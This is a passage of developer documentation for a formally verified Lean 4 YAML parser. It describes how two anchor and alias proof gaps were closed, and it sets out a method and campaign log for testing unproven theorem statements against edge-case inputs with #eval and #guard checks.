anchored block-context plain scalars don't contain `{`, `}`, `[`, `]`,
or `,`. This covers the vast majority of real-world YAML — cross-context
aliasing of plain scalars with flow indicators is extremely rare.

**Advantage:** Minimal code changes, the precondition is easy to
understand, and most YAML documents satisfy it trivially.

**Disadvantage:** The final theorem has an extra hypothesis, weakening
its universality.

##### Option D: Accept and Document

Leave both sorrys with documentation explaining the gap. The final
theorem would have `sorry` annotations but the documentation makes clear
that:
- All algorithmic proof obligations are discharged.
- The two remaining gaps are at the specification/modeling interface.
- The gaps affect only YAML documents with cross-context aliasing of
  plain scalars containing flow indicators — a nearly-nonexistent
  corner case in practice.

---

### Interaction Between the Two Gaps

Gap #8 (alias ordering) and Gap #9 (cross-context aliasing) are
**independent**:

- Resolving #8 alone (proving `AllAliasesResolve`) would reduce sorrys
  from 2 to 1.
- Resolving #9 alone (proving `WellFormedAnchors`) would reduce sorrys
  from 2 to 1.
- Both can be resolved independently.

However, the two gaps share one structural feature: they both involve
the **anchor/alias pipeline** that crosses scanner → parser → composition
boundaries. Any refactoring of anchor handling affects both.

Both gaps now require **parse loop invariants** over `parseStreamLoop`:
- Gap #8: "every `.alias name` in the value tree has `name ∈ ps.anchors`"
- Gap #9: "every value in `ps.anchors` satisfies `∀ inFlow, Grammable _ inFlow`"

A single loop invariant combining both properties would be the most
efficient approach.

---

### Diagnosis Summary

| Aspect | Gap #8 (Aliases Resolve) | Gap #9 (Anchors Well-Formed) |
|--------|--------------------------|------------------------------|
| **Root cause** | Scanner doesn't prove anchor-before-alias ordering | `∀ inFlow` quantifier too strong for cross-context aliasing |
| **YAML spec clear?** | ✅ Yes — §7.1 requires preceding anchor | ⚠️ Partially — spec allows cross-context aliasing but doesn't address serialization-level implications |
| **Our formalization clear?** | ✅ Yes — `AllAliasesResolve` is correct | ✅ Yes — `adaptForFlowContext` in `addAnchor` makes stored values universally grammable |
| **Is the predicate correct?** | ✅ Yes | ✅ Yes — now satisfiable via `adaptForFlowContext` |
| **Counterexample to provability?** | None (should be provable) | ~~Yes — `&a value{braces}` + `[*a]`~~ **Resolved**: `addAnchor` converts to `.doubleQuoted` |
| **Category** | Formalization gap | ~~Specification modeling gap~~ → **Resolved at runtime** |
| **Proof status** | ✅ All three phases complete — zero sorrys | Helper lemmas all proven; loop invariant needed |

---

### Decisions

#### Gap #8: Three-Phase Plan (D → B → A)

Gap #8 is resolved in three phases.  Phase 1 is complete.  The
remaining phases are reordered: scanner first (Phase 3), then parser
sorrys (Phase 2), because the scanner theorem trivializes the parser
proof:

##### Phase 1: Option D — Parser-Level Alias Validation

**Goal:** Close the sorry immediately by construction.

Add runtime alias validation in `parseNode`. When the parser encounters
`.alias name`, check that `name ∈ ps.anchors`; throw an error if not.

**Code change** (one line in `parseNode`, TokenParser.lean ~L337):
```lean
| some (.alias name) =>
    if !ps.anchors.any (fun (n, _) => n == name) then
      throw (.undefinedAlias nodeStartPos.line nodeStartPos.col)
    -- ... existing advance + return
```

**Proof strategy** for `AllAliasesResolve`:
1. Every `.alias name` in the value tree passed the `ps.anchors` check
2. `ps.anchors` is monotonically growing (push-only via `addAnchor`)
3. Therefore `name ∈ doc.anchors` at document end
4. Thread through existing `_wb` chain as an additional conclusion

**Conformance impact:** YAML §7.1 already rejects undefined aliases.
This is a conformance improvement, not a behavior change for valid YAML.

##### Phase 2: Parser-Level Sorrys (after Phase 3)

**Goal:** Discharge the two remaining sorry helpers using the scanner
theorem from Phase 3.

Once `scan_aliases_have_prior_anchors` is proven, add
`AliasesHaveAnchors tokens` as a (trivially-discharged) precondition
to `parseStream`.  Then:
- `parseNode_anchors_grow` follows from token-level anchor ordering:
  `ps.anchors` grows only via `addAnchor`, which processes tokens
  linearly.
- `parseNode_aliases_resolve` follows from the `if` guard in Phase 1
  plus anchors monotonicity: the guard certifies
  `name ∈ ps.anchors` at parse time, and `ps.anchors ⊆ doc.anchors`
  by monotonicity.

No mutual induction over 14 functions is needed — the scanner
theorem provides the structural invariant that the parser proof
previously had to establish from scratch.

##### Phase 3: Option A — Scanner-Level `definedAnchors` Field ✅ COMPLETE

**Goal:** Prove YAML §7.1 conformance at the scanner level — the
semantically correct result.

**Implementation (completed 2026-03-18):**
1. Added `definedAnchors : Array String` to `ScannerState`
2. `scanAnchorOrAlias` kept as pure function (`ScannerState` return,
   not `Except`) — all 8+ preservation theorems untouched
3. Validation moved to `scanNextToken_dispatchContent`:
   - Anchor (`&`): calls pure `scanAnchorOrAlias`, wraps result with
     `definedAnchors.push name`
   - Alias (`*`): checks `s.definedAnchors.any (· == name)`, rejects
     if absent (§7.1 conformance), delegates to pure function on success
4. `scanDocumentStart` / `scanDocumentEnd`: reset `definedAnchors := #[]`
5. Dispatch proofs updated in ScannerCorrectness.lean (4 proofs) and
   ScannerPlainScalarValid.lean (3 proofs)
6. Guard test files updated (ScannerProgress, ScannerDocument, ScannerDispatch)

**Intended outcome** (see correction below): a standalone scanner theorem:
```lean
theorem scan_aliases_have_prior_anchors
    (tokens : Array (Positioned YamlToken))
    (h_scan : scanFiltered input = .ok tokens) :
    ∀ i (hi : i < tokens.size),
      match (tokens[i]'hi).val with
      | .alias name => ∃ j (hj : j < i),
          (tokens[j]'(by omega)).val = .anchor name
      | _ => True
```

This proves the scanner conforms to §7.1 independent of the parser,
and makes Phase 1's parser-level validation redundant (but harmless
as defense-in-depth).

> **Correction (2026-07-31):** the `definedAnchors` *runtime* enforcement
> described above did land (scanner-level alias validation, §7.1 rejection),
> but the standalone theorem `scan_aliases_have_prior_anchors` was **never
> formalized** — it does not exist in the proof corpus. Gap #8 was instead
> closed entirely at the parser level: `parseStream_output_aliases_resolve`
> (`L4YAML/Proofs/Parser/ParserAnchorProofs.lean:201`), whose proof rests on
> the parser's own alias guard and anchor monotonicity, needing no scanner
> precondition.

#### Gap #9: Option B′ — `adaptForFlowContext` in `addAnchor` ✅ IMPLEMENTED

**Decision (revised):** The original plan (existentially quantify over
scalar styles in `Grammable.scalar`) was prototyped and **reverted** —
the existential witness propagation required modifying dozens of proof
sites throughout the chain. Instead, we implemented a runtime
transformation that makes stored anchor values universally grammable
*before* they enter the anchor map.

**Approach:** `addAnchor` (TokenParser.lean L149) now calls
`YamlValue.adaptForFlowContext` on every value before storing it:

```lean
-- TokenParser.lean, addAnchor:
let cleaned := ((val.resolveAliases ps.anchors).stripAnchors).adaptForFlowContext
```

`adaptForFlowContext` (Types.lean) recursively processes a value tree:
- **Plain scalars with flow indicators** → style changed to `.doubleQuoted`
- **All other scalars** → unchanged
- **Collections** → recurse into children

The flow indicator check uses `hasFlowIndicator` (a Bool function over
char lists matching `isFlowIndicatorProp`).

**Why this works:** After `adaptForFlowContext`, every plain scalar in
the anchor value either:
1. Has no flow indicators → `ScalarScannable s true` follows from
   `ScalarScannable s false` + `noFlowIndicatorsProp` (proven in
   `ScalarScannable_false_to_true_noFI`)
2. Was converted to `.doubleQuoted` → `ScalarScannable` is vacuously
   true (gated on `s.style = .plain`)

This makes `∀ inFlow, Grammable val inFlow` provable without changing
the `Grammable` predicate.

**Advantages over existential approach:**
- `Grammable` predicate unchanged — zero impact on existing proof chain
- No existential witness propagation through ~40 proof lemmas
- Runtime behavior is YAML-compliant (re-quoting is what serializers do)
- Tests: 857 passed, 12 failed, 151 skipped (no regressions)

**Proven lemmas** (all in ParserGrammable.lean, sorry-free):

| Lemma | Purpose |
|-------|---------|
| `hasFlowIndicator_false_noFlowIndicators` | `hasFlowIndicator cs = false → noFlowIndicatorsProp` |
| `ScalarScannable_false_to_true_noFI` | `ScalarScannable s false` + `noFlowIndicatorsProp` → `ScalarScannable s true` |
| `adaptList_eq_map` | Where-clause `adaptList` = `List.map adaptForFlowContext` |
| `adaptPairs_eq_map` | Where-clause `adaptPairs` = `List.map` over pairs |
| `adaptForFlowContext_grammable_forall` | **Core lifting lemma**: `Grammable v b → ∀ inFlow, Grammable v.adaptForFlowContext inFlow` |

**Remaining work for Gap #9: DONE (2026-07).** The loop invariant described
here was written and proven: `parseStreamLoop_wfa`
(`L4YAML/Proofs/Parser/ParserWfaProofs.lean:1622`) threads
`adaptForFlowContext_grammable_forall` through `parseStreamLoop` /
`parseDocument`, and discharges `parseStream_output_anchors_wellformed`
(`ParserWfaProofs.lean:1691`) — under `FlowAwarePSV` + `FlowBracketsMatched`
hypotheses (see the Gap #9 statement note above). No sorry remains.

---

## Adversarial instantiation

*(was `ADVERSARIAL_INSTANTIATION.md` — "Adversarial Instantiation — Auditing Sorry'd Theorems"; consolidated into this file 2026-08-01, file-level history in git)*

> **Status (2026-07-31): CLOSED/HISTORICAL.** Campaign complete; the library is
> sorry-free since 2026-07-04 (see Blueprint/04-capstones.md, the proof-status
> SSOT). Paths and line numbers below may predate the 2026-04 folder
> reorganization and the 2026-07-31 theorem→lemma rename. The audit *method*
> (first half of this document) remains valid reference; the sorry inventory and
> per-priority campaign log are a historical record.

**Purpose:** Detect false theorem statements before investing proof effort, by
systematically instantiating sorry'd theorems on adversarial inputs via `#eval` / `#guard`.

Analogous to fuzz testing for code, but targeting the gap between "sorry'd claim" and
"actually true statement" in formal proofs.

### Motivation

False theorem statements are the hardest bugs to find in a proof development. A sorry'd
theorem with a plausible-looking universal quantifier may pass cursory review, yet be
unprovable because the quantifier is too broad. The failure mode is insidious: simple
inputs (flat collections, small sizes) satisfy the claim, while adversarial inputs (deep
nesting, mixed types, boundary sizes) expose the falsity.

### Method

#### 1. Identify audit targets

Every sorry'd theorem is a candidate. Prioritize by:

- **Universality risk:** Theorems with `∀` over positions, states, or indices are highest risk.
- **Precondition adequacy:** Does the precondition grow with the conclusion? A postcondition
  that was strengthened (e.g., adding `flowBracketBalance = 0`) without a matching
  precondition update is a red flag.
- **Proof distance:** Theorems far from their sorry introduction (many layers of sorry'd
  dependencies) accumulate false-statement risk at each layer.

#### 2. Design adversarial inputs

For each sorry'd theorem, construct inputs that stress the universality along these dimensions:

| Dimension | Test values | Rationale |
|-----------|-------------|-----------|
| **Size** | 0, 1, 2 | Boundary cases; off-by-one in ≤/< |
| **Nesting depth** | 0, 1, 2, 3 | Flat inputs pass when nested ones fail |
| **Type mixing** | scalar-only, seq-in-seq, map-in-seq, seq-in-map | Cross-type interactions expose implicit assumptions |
| **Position** | first, last, middle | Universal quantifiers over indices |
| **State** | initial, mid-flow, post-bracket | Scanner/parser state-dependent claims |

**Key heuristic:** If a theorem holds for flat/simple inputs but the proof feels hard,
try a nested/mixed input computationally before diagnosing the proof difficulty.

#### 3. Instantiate and check

```lean
-- Pattern: ∀ x, P x → Q x   (sorry'd)
-- Audit: pick concrete x₀ where P x₀ holds, check Q x₀

-- Decidable properties: use #guard
#guard (Q concreteInput1) == true
#guard (Q concreteInput2) == true   -- adversarial

-- Non-decidable or complex: use #eval with diagnostic output
#eval do
  let result := computeQ adversarialInput
  if !result then
    IO.println s!"COUNTEREXAMPLE: {adversarialInput}"
  pure result
```

Place audit checks in a dedicated test module (in this project:
`Tests/AdversarialInstantiation.lean`) for permanent harnesses. Do NOT place in
proof files — audits are development-time tools.

#### 4. Red flag patterns

Certain theorem shapes are empirically high-risk for false statements:

| Pattern | Risk | Why |
|---------|------|-----|
| `∀ k, lo ≤ k → k < hi → P tokens[k]` | **HIGH** | Universal over positions ignores nesting depth |
| `∀ ps, ps.peek? = some tok → Q ps` | **HIGH** | Universal over parser states ignores context (flowLevel, indent stack) |
| Postcondition added without matching precondition | **HIGH** | Predicate strengthening without hypothesis strengthening |
| `tokens.size ≥ n → P` (size-only precondition) | **MEDIUM** | Size necessary but insufficient; structure matters |
| `∀ fuel, fuel ≥ n → f fuel = ok` | **MEDIUM** | Fuel bound may depend on input structure, not just size |
| Pure arithmetic on folds/ranges | **LOW** | Usually true if types are correct (but check boundary cases) |

#### 5. Audit frequency

- **Before starting any proof of a sorry'd theorem:** Run the audit on that theorem first.
- **After strengthening a predicate:** Re-audit all theorems that use the predicate.
- **After discovering a false theorem:** Audit all sibling theorems with similar quantifier
  structure (they likely share the same implicit assumption).

### Integration with Lean 4 tooling

#### `slim_check` / `plausible`

Lean 4's built-in property-testing tactic works for types with `SampleableExt` instances:

```lean
example : ∀ (n m : Nat), n + m = m + n := by plausible  -- passes
example : ∀ (n : Nat), n < 100 := by plausible           -- finds counterexample
```

Limitation: Custom types (`YamlToken`, `ParseState`) need `SampleableExt` instances.
For domain-specific types, manual adversarial instantiation (Method §3) is more practical
than building sampling infrastructure.

#### `#guard` vs `#eval`

- `#guard expr` — compile-time assertion; fails the build if `expr` evaluates to `false`.
  Use for decidable, fast-to-evaluate properties.
- `#eval expr` — prints result; use for properties that need diagnostic output or are
  too expensive for compile-time evaluation.
- `native_decide` — for properties that are decidable but too large for the kernel
  evaluator. Compiles to native code. Use sparingly (compilation overhead).

### Relationship to other techniques

| Technique | Scope | Catches |
|-----------|-------|---------|
| **Adversarial Instantiation** | Sorry'd theorem statements | False universal claims |
| Type checking | All code | Type errors, missing arguments |
| `slim_check` / `plausible` | Decidable Prop with SampleableExt | Random counterexamples |
| Code review | Theorem signatures | Suspicious patterns (requires expertise) |
| Proof attempt | Individual theorems | Unprovability (but expensive to discover) |

Adversarial Instantiation fills the gap between "the theorem type-checks" and "the
theorem is true" — the gap where sorry lives.

## Adversarial instantiation campaign (historical)

### Triage: When to Audit vs. When to Prove Directly

Not every sorry'd theorem warrants adversarial instantiation. The decision is a 2×2 matrix
of **statement risk** (could the theorem be false?) and **proof cost** (how hard to prove?):

```
                        Proof Cost
                    LOW              HIGH
                ┌────────────┬─────────────────┐
Statement  LOW  │  PROVE     │  PROVE          │
Risk            │  directly  │ (audit optional)│
                ├────────────┼─────────────────┤
           HIGH │  AUDIT     │  AUDIT          │
                │  then      │  first, then    │
                │  PROVE     │  PROVE          │
                └────────────┴─────────────────┘
```

High statement risk + low proof cost → audit is cheap insurance, do both.
Low statement risk + high proof cost → proof effort is the bottleneck, skip audit.
High statement risk + high proof cost → **audit is critical** — don't invest weeks in
proving a false statement.

#### Statement Risk Indicators (fast to assess: ~30 seconds each)

| Indicator | Risk level | How to check |
|-----------|-----------|--------------|
| `∀` over positions/indices in arrays | **HIGH** | Scan for `∀ k, lo ≤ k → k < hi → P tokens[k]` |
| `∀` over scanner/parser states | **HIGH** | Universal over `ScannerState` or `ParseState` |
| Postcondition strengthened recently | **HIGH** | Was a field added to the predicate without a matching hypothesis? |
| Existential in conclusion | **MEDIUM** | `∃ s', f s = ok s' ∧ P s'` — the existence claim itself could fail |
| Pure arithmetic on list/array folds | **LOW** | `fbb(lo,hi) = fbb(lo,mid) + fbb(mid,hi)` — correct by construction |
| Single-function unfold | **LOW** | `scanBlockEntry s = ok s' → P s'` — one function, no composition |

#### Proof Cost Indicators (fast to assess: ~30 seconds each)

| Indicator | Cost level | How to check |
|-----------|-----------|--------------|
| Estimated ≤ 25 LOC | **LOW** | See Est. LOC in sorry inventory |
| No loops in the function | **LOW** | Direct unfold + field access |
| Single dispatch branch | **LOW** | One function, no case explosion |
| Requires loop invariant | **HIGH** | `skipToContent`, `unwindIndents`, scalar loops |
| Requires recursive/inductive reasoning | **HIGH** | Nested collections, fuel sufficiency |
| Depends on 2+ sorry'd lemmas | **HIGH** | Blocked until dependencies are cleared |

#### Decision rule

1. Check statement risk indicators (~30 sec). If ≥ 1 HIGH indicator → **AUDIT**.
2. If no HIGH risk indicators, check proof cost. If LOW → **PROVE directly** (skip audit).
3. If HIGH proof cost + MEDIUM risk → **AUDIT** (cheap insurance before expensive proof).
4. If LOW proof cost + HIGH risk → **AUDIT then PROVE** (audit catches bugs fast, proof is easy).

**Time budget**: Adversarial instantiation should take ≤ 30 minutes per theorem (writing
`#eval`/`#guard` checks). If it takes longer, the theorem's predicates may not be
computationally tractable for testing — fall back to careful manual review of the
statement.

### Sorry Inventory at Time of Campaign (historical): Triage Results (21 sorrys)

#### Category 1: PROVE directly (11 theorems, ~$250 LOC)

These are low-risk, low-to-medium cost. Skip adversarial instantiation.

| # | Theorem | Why PROVE | Est. LOC |
|---|---------|-----------|----------|
| 9i | `flowBracketBalance_compose` | Pure list fold arithmetic. Partition foldl. | 15–25 |
| 9j | `flowBracketBalance_push` | Pure array push doesn't affect prior slice. | 15–25 |
| 9k | `parseFlowSequenceLoop_emitter_ok` h_bal (×2) | Direct corollary of `_compose`. `rw; ring`. | 10–20 |
| 9l | `parseFlowMappingLoop_emitter_ok` h_bal (×2) | Same pattern. | 10–20 |
| — | `scanBlockEntry_filtered_grows` | Single function, one `emit .blockEntry`. | 15–25 |
| — | `scanKey_filtered_grows` | Single function, one `emit .key`. | 15–25 |
| — | `scanValue_filtered_grows` | Single function + `setIfInBounds`. | 20–30 |
| — | `dispatchContent_filtered_grows` | Dispatch + per-function composition. | 30–50 |
| — | `scanNextToken_filtered_grows` (structural case) | `scanDirective` branch; vacuous for emitter output. | 10–20 |
| — | `dispatchFlowIndicators_preserves_bound` | One branch (flowEntry), injection + field access. | 10–20 |
| — | `scanValue_BoundInv` | No loops, field updates + advance. | 40–80 |

##### Category 1 accomplishments

All 11 Category 1 theorems have been addressed:

| # | Theorem | Status | Notes |
|---|---------|--------|-------|
| 9i | `flowBracketBalance_compose` | **PROVEN** | List fold partition via `List.take_append_drop` |
| 9j | `flowBracketBalance_push` | **PROVEN** | Array push doesn't affect prior slice |
| 9k | `parseFlowSequenceLoop_emitter_ok` h_bal (×2) | **PROVEN** | Corollary of `_compose` |
| 9l | `parseFlowMappingLoop_emitter_ok` h_bal (×2) | **PROVEN** | Same pattern |
| — | `scanBlockEntry_filtered_grows` | **PROVEN** | `filtered_grows_of_any_new` + `emit_tokens_push` |
| — | `scanKey_filtered_grows` | **PROVEN** | Same pattern |
| — | `scanValue_filtered_grows` | **PROVEN** | Complex: `setIfInBounds` + `Array_setIfInBounds_filter_mono` |
| — | `dispatchContent_filtered_grows` | **PROVEN** | Used helper `dispatchContent_new_not_placeholder` |
| — | `scanNextToken_filtered_grows` (directive case) | **→ Cat 2** | Reclassified: unknown directives emit 0 tokens |
| — | `dispatchFlowIndicators_preserves_bound` | **PROVEN** | Injection + field access |
| — | `scanValue_BoundInv` | **PROVEN** | No loops, field updates + advance |

10 of 11 proven. 1 reclassified to Category 2 (the directive case in `scanNextToken_filtered_grows`
requires knowing that emitter-produced inputs don't contain unknown `%RESERVED` directives).

##### Category 1 reflections

**What worked:**
- The `filtered_grows_of_any_new` lemma pattern was highly reusable across all `*_filtered_grows` proofs.
- Per-scanner `_adds_one_token` and `_preserves_prefix` lemmas from ScannerCorrectness.lean composed cleanly.
- `Array_setIfInBounds_filter_mono` handled the `scanValue` case where a `.placeholder` token is overwritten.

**What didn't:**
- `simp only [Except.ok.injEq] at h` inside `<;>` blocks can fail when `h` has already been simplified in a prior step. The `<;>` combinator applies to post-split goals where `h` may no longer contain `Except.ok`.
- `simp only [bind, Except.bind]` vs `simp only [Bind.bind, Except.bind]` — both work in isolation but can fail inside large proofs where the hypothesis has already been modified by earlier simp steps. The root cause was the `<;>` combinator, not the simp lemma choice.
- `dsimp only []` after `unfold scanNamedTag` in a goal context: `scanNamedTag` has nested `let` bindings that `simp only []` can't handle but `dsimp only []` reduces correctly.

**Lessons:**
1. When using `split at h <;> (tactic_seq)`, ensure `tactic_seq` is idempotent — it runs on each branch independently, so tactics that already succeeded (like `simp [Except.ok.injEq]`) must not fail when re-run on the post-split state.
2. The `dispatchContent_new_not_placeholder` helper (proving the newly-added token is non-placeholder) was the hardest single theorem — it required unfolding 7 different content scanners through their `emitAt` calls to extract the actual token value.

#### Category 2: AUDIT then PROVE (10 theorems, ~$1500 LOC)

These have universal quantifiers over states/positions/values and/or complex invariants.
Adversarial instantiation should be applied **before** investing proof effort.

| # | Theorem | Risk factor | Audit approach | Est. LOC |
|---|---------|-------------|----------------|----------|
| 9e | `scanNextToken_prefix_and_sk_inv` | `∀ s` × disjunctive invariant | Run `scanNextToken` on states with various `sk/ek` configs, check prefix + invariant | 50–100 |
| 9g | `emitList_body_filtered_characterization` | `∀ positions` (ALREADY CAUGHT BUG) | Re-test with 3-level nesting after bracketBalance fix | 40–80 |
| 9h | `emitPairList_body_filtered_characterization` | `∀ positions` (same class) | Re-test with nested maps-in-seqs, seqs-in-maps | 40–80 |
| 9a | `parseStream_emitSequence` (h_pnok sorry) | Parser succeeds on all content-start tokens | `#eval` parseNode at each content-start position in scanned emitter output | 200–400 |
| 9b | `parseStream_emitMapping` (h_pnok sorry) | Same for mappings | Same approach | 200–400 |
| 9c | `emit_roundtrip_sequence_content_eq` | End-to-end content fidelity, `∀ items` | `#eval parseYamlRaw (emit [nested, mixed, values])` and check equality | 150–300 |
| 9d | `emit_roundtrip_mapping_content_eq` | End-to-end for mappings | Same | 150–300 |
| — | `preprocess_preserves_bound` | Loops (`skipToContent`, `unwindIndents`) | Construct states with deep indent stacks, check BoundInv | 80–120 |
| — | `dispatchStructural_preserves_bound` | `scanDirective` loops | Test with ≥5 %YAML/%TAG directives | 60–80 |
| — | `dispatchContent_preserves_bound` | ALL scalar scanner loops | Run each scalar scanner on long/edge-case strings, check BoundInv | 100–150 |

### Adversarial Test Suite Design

#### Priority 1: Theorems 9g, 9h (previously caught bug)

These are the highest-value audit targets — we already found one false statement here.
Re-verify after the `flowBracketBalance` fix:

**Inputs:**
```
-- Flat (should pass): ["a", "b", "c"]
-- 1-level nesting: [["a", "b"], "c"]
-- 2-level nesting: [[["a"]]]
-- Mixed: [{"k": "v"}, ["a"]]
-- Map-in-map: {"a": {"b": "c"}}
-- Previously-failing: [{"k1": "v1", "k2": "v2"}]
```

**Check:** For each `flowEntry` at `flowBracketBalance = 0`, verify the next filtered token
is a content-start (scalar/flowSeqStart/flowMapStart) for sequences, or `.key` for mappings.

#### Priority 1: Accomplishments

**Test suite:** `Tests/AdversarialInstantiation.lean` — 188 checks, all passing.
Integrated into CI via `lakefile.lean` (`adversarialinstantiation` target) and
the suite runner's verified test suites.

**Test coverage (9g — `emitList_body_filtered_characterization`):**
- Flat sequences: 1, 2, 3 items
- 1-level nesting: `[["a","b"],"c"]`, `[{"k":"v"},"c"]`
- 2-level nesting: `[[["a"]]]`, `[[["a"]],"b"]`
- Mixed: `[{"k":"v"},["a"]]`, `["plain",["a","b"],{"x":"y"}]`
- Previously-failing: `[{"k1":"v1","k2":"v2"}]`, `[{"k1":"v1","k2":"v2"},"after"]`
- Deep: `[[[[deep]]]]`, `[{"a":[{"b":"c"}]}]`
- Edge cases: empty scalar, special chars with escapes, 6-item list

**Test coverage (9h — `emitPairList_body_filtered_characterization`):**
- Single/multi pair: 1, 2, 3 pairs
- Nested values: sequences in values, mappings in values, sequences as keys
- Mixed: `{"items":["x","y"],"count":"2"}`, `{"data":[{"id":"1"},{"id":"2"}],"meta":{"ver":"1.0"}}`
- Deep: `{"k":[[["deep"]]]}`, `{"a":[["1"]],"b":{"c":{"d":"e"}}}`
- Edge cases: empty key, empty value, special chars, 6-pair mapping

**Key verification points:**
1. First body token is content-start (9g) or `.key` (9h) — verified for all inputs
2. Outer-level `flowEntry` (bracketBalance = 0) is always followed by content-start (9g) or `.key` (9h)
3. Inner `flowEntry` tokens (bracketBalance > 0, inside nested brackets) are correctly excluded
4. The `flowBracketBalance` computation correctly distinguishes nesting levels

**Tokens observed (representative):**
- `[{"k1":"v1","k2":"v2"},"after"]` → `streamStart [ { key scalar(k1) : scalar(v1) , key scalar(k2) : scalar(v2) } , scalar(after) ] streamEnd`
  - Inner `,` at position 8 has bal=1 (inside `{}`), correctly skipped
  - Outer `,` at position 12 has bal=0, next is `scalar(after)` ✓

#### Priority 1: Reflections

**Confidence level:** HIGH. The test suite covers the exact input patterns that previously
triggered a false statement (nested mappings inside sequences where inner `flowEntry` tokens
at non-zero bracket balance were incorrectly required to be followed by content-start). The
`flowBracketBalance` fix (theorems 9i–9l, now proven) correctly distinguishes inner vs outer
commas.

**What was verified:**
- The `flowBracketBalance` predicate accurately identifies outer-level commas
- All 7 content scanner types (scalar variants, nested `[`, nested `{`) produce the expected
  first filtered token
- The `, ` separator between items produces exactly one `.flowEntry` token at the right
  nesting level

**Residual risk:** LOW. The adversarial inputs include the previously-failing case and several
more complex nesting patterns. No new failures discovered. The theorem statements align with
observed scanner behavior.

#### Priority 2: Theorems 9c, 9d (end-to-end round-trip)

These are directly checkable via `emit → scanFiltered → parseYamlRaw → contentEq`:

**Inputs:**
```
-- Scalars: "hello", "with \"escape\"", ""
-- Sequences: ["a"], ["a", "b"], [["nested"]]
-- Mappings: {"k": "v"}, {"k1": "v1", "k2": "v2"}
-- Nested: [{"k": ["a", "b"]}, "c"]
-- Deep: [[[[["deep"]]]]]
```

**Check:** `contentEq (parseYamlRaw (emit v)).get! v = true`

#### Priority 2: Accomplishments

**Test suite:** `Tests/AdversarialInstantiation.lean` — 141 new checks (329 total), all passing.

**Test coverage (scalars — base case for both 9c and 9d):**
- Plain text, empty string, escape sequences (`\"`, `\n`, `\t`, `\\`)
- Null byte (`\u0000`), colon-space (`key: value`), hash (`not # a comment`)
- Brackets/braces in scalar content (`[not, a, sequence]`, `{not: a, mapping}`)

**Test coverage (9c — `emit_roundtrip_sequence_content_eq`):**
- Empty sequence, 1/2/3-item flat, nested 1–4 levels deep
- Sequences containing mappings (single-pair & multi-pair)
- Mixed nesting: `[plain, [a, b], {x: y}]`, `[{a: [{b: c}]}]`
- Edge cases: empty scalars, special chars, 8-item list
- Previously-failing pattern: `[{k1: v1, k2: v2}, after]`

**Test coverage (9d — `emit_roundtrip_mapping_content_eq`):**
- Empty mapping, 1/2/3-pair flat, nested 1–3 levels deep
- Mappings with sequence values (flat & nested)
- Mixed nesting: `{items: [x, y], count: 2}`, `{data: [{id: 1}, {id: 2}], meta: {ver: 1.0}}`
- Deep nesting: 5-level sequences, 5-level mappings
- Sequence keys, mapping keys (complex key structures)
- Edge cases: empty key, empty value, special chars, 6-pair mapping
- Cross-nested: `[{key: [{inner: [a, b]}]}]`

**Key verification points:**
1. `parseYamlRaw (emit v)` succeeds for every test input
2. Exactly 1 document is produced in all cases
3. `contentEq v (composed[0]!.value) = true` — original value is content-equivalent
   to the round-tripped result for all 47 distinct `YamlValue` inputs

#### Priority 2: Reflections

**Confidence level:** HIGH. The round-trip property holds across all tested inputs,
including adversarial scalar content (escape sequences, YAML metacharacters embedded
in strings), deeply nested structures (5 levels), and complex key types (sequence
and mapping keys).

**What was verified:**
- The emitter produces valid YAML that parses back correctly for all tested structures
- `contentEq` correctly ignores style differences (emitter always uses double-quoted/flow,
  parser may assign different styles)
- Nested structures round-trip faithfully: the recursive `contentEq` check passes
  through all nesting levels
- Complex keys (sequences and mappings as mapping keys) are handled correctly

**Residual risk:** LOW. The theorem requires an inductive hypothesis (`ih`/`ihk`/`ihv`)
for recursive sub-values; our tests cover the recursive structure up to 5 levels deep.
The base case (empty collections) is already proven in the theorem. The remaining sorry
is in the `_ :: _` branch — the non-empty inductive case.

#### Priority 3: Theorems 9a, 9b (parser fuel sufficiency)

The claim `4 * tokens.size + 4` as fuel bound is testable:

**Check:** `parseFlowSequence tokens 0 (4 * tokens.size + 4)` returns `.ok` for scanned
emitter output. Also test with `4 * tokens.size + 3` (one less) to verify tightness.

#### Priority 3: Accomplishments

- **180 new checks** (509 total: 188 P1 + 141 P2 + 180 P3), all passing
- Tested `parseStream (scanFiltered (emit v))` succeeds for 45 adversarial inputs spanning:
  - **Sequences (9a):** empty, 1–16 elements, depth 2–7, wide+deep, mixed nesting with mappings, previously-failing inner-comma patterns
  - **Mappings (9b):** empty, 1–16 entries, depth 2–6, sequence/mapping keys, complex nested values
  - **Cross-type:** alternating seq/map nesting, wide at multiple levels, realistic multi-level structures
- Each input checks: (1) scan success, (2) `parseStream` returns `.ok`, (3) exactly 1 document, (4) tightness — `parseNode` at pos=1 with fuel `4*N+3` (one less than `parseDocument` uses)
- **Tightness finding:** `4*N+3` suffices for ALL tested inputs — the bound `4*N+4` has at least 1 unit of slack. No input found that requires exactly `4*N+4`.
- Token counts range from N=4 (empty seq/map) to N=84 (map-width-16), exercising fuel from 19 to 340

#### Priority 3: Reflections

- **The fuel bound is not tight.** Every tested input succeeded with fuel `4*N+3`. This means the `+4` constant in `4*N+4` has margin. This is actually desirable for proof robustness: a non-tight bound is easier to prove because there's no single worst-case input to characterize.
- **Fuel scales linearly with tokens**, which scales linearly with structure size. Deep nesting adds ~8 tokens per level (open+close brackets + content + comma overhead). Wide structures add ~4 tokens per entry (content + comma + key/value for maps). The `4×` factor in `4*N` comfortably covers both.
- **No counterexample found** for the fuel sufficiency claim across diverse structures up to depth 7 and width 16. The sorry'd `ParseNodeFlowSeqOk`/`ParseEntryFlowMapOk` predicates appear sound.
- **Residual risk:** LOW. The fuel bound `4*N+4` is conservative with slack. The only remaining risk would be pathological token sequences not producible by the emitter (but the theorems restrict to emitter output via the `h_scan` hypothesis).
- **Proof strategy hint:** Since `4*N+3` also works, a proof via induction on fuel could use `4*N+4` - 1 for the recursive call without worrying about off-by-one at the base.

#### Priority 4: Theorem 9e (scanner prefix invariant)

**Inputs:** Construct `ScannerState` values with:
- `simpleKey.possible = true, tokenIndex < n` (restored from flowStack)
- `explicitKeyLine = some _` (after scanValue)
- Both conditions false (normal flow)

**Check:** After `scanNextToken`, verify prefix preserved AND disjunctive condition maintained.

#### Priority 4: Accomplishments

- **168 new checks** (677 total: 188 P1 + 141 P2 + 180 P3 + 168 P4), all passing
- Tested `scanNextToken` step-by-step on **55 diverse YAML inputs** spanning:
  - **Flow indicators:** empty/flat/nested sequences and mappings, 1–5 levels deep
  - **Quoted scalars:** double-quoted, single-quoted, escape sequences, unicode
  - **Block scalars:** literal (`|`), folded (`>`)
  - **Block sequences:** flat, nested, 1–10 items
